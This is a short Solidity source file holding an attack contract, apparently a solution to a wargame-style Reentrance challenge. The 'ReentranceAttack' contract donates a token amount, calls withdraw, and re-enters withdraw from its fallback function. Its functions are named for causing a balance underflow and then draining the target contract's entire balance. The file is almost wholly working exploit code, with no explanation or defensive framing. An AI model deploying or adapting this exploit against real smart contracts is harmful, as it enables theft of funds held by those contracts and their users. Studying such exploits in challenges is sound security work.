pragma solidity ^0.4.18;

contract Reentrance {
  function donate(address _to) public payable {}
  function withdraw(uint _amount) public {}
}

contract ReentranceAttack {

  Reentrance target;

  function ReentranceAttack(address _target) public payable {
    target = Reentrance(_target);
  }

  function attack_1_causeOverflow() public {
    target.donate.value(1)(this);
    target.withdraw(1);
  }

  function attack_2_deplete() public {
    target.withdraw(target.balance);
  }

  function() public payable {
    target.withdraw(1);
  }
}
